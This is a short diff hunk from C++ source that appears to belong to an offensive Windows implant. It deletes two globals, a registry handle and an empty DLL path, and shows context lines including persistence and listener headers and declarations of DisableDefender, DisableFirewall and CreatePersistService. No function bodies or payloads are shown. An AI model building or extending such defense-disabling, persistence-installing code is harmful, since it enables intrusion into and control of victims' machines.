@@ -14,9 +14,6 @@
 #include "..\persistence\embed.hpp"
 #include "..\listener\embed.hpp"
 
-HKEY HKLM = HKEY_LOCAL_MACHINE;
-LPCSTR dllPath = "";
-
 void DisableDefender();
 void DisableFirewall();
 int CreatePersistService();
